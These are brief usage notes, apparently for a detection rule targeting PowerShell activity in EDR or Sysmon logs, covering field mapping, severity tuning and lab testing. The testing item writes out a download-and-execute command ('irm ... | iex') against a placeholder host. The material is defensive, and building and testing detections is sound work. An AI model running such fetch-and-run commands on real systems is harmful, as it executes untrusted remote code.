# Usage Notes

- Field names: Adjust `Image`, `CommandLine` for your EDR/Sysmon schema.
- Tuning: Start in `informational` mode; promote to `high` once baseline is known.
- Testing: Use benign PS commands (e.g., `powershell -c "irm example.com/a.ps1 | iex"`) in lab only.
